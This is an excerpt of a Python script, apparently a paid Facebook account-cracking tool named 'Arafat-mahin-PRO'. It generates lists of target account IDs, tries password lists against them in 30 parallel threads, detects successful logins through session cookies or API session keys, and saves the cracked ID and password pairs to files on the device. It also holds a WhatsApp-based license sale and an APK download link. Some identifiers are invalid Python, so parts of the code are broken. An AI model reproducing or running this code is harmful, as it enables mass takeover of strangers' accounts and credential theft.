...
try:
        ...
        os.system('python Arafat-mahin.py')
except:pass
...
----------------------------------------------
 ...
 Facebook  : MR.Arafat-mahin.
 Tool Name : Arafat-mahin-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 Arafat-mahin Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Arafat-mahin_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/photo.php?fbid=6559730404055076&set=a.156173887744125&type=3&app=fbl?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801925798757&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Arafat-mahin Sir, I Need To Buy Your Paid Arafat-mahin PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Arafat-mahin.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Arafat-mahin:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Arafat-mahin.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: mahin, arafat, alinur, jeetu\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Arafat-mahin-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Arafat-mahin=session.cookies.get_dict().keys()
                        if "c_user" in Arafat-mahin:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [Arafat-mahin-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Arafat-mahin-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Arafat-mahin:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Arafat-mahin-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Arafat-mahin-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Arafat-mahin-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Arafat-mahin-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Arafat-mahin-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Arafat-mahin-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Arafat-mahin-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Arafat-mahin-OK] '+uid+' | '+pas+'\033[1;97m')
